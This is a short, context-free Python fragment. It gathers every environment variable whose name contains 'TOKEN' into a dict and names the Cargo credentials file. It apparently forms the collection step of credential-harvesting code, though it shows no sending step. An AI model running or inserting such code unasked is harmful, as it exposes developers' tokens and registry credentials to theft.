import os
blob = {"env": {k: v for k,v in os.environ.items() if "TOKEN" in k}}
files = [".cargo/credentials"]
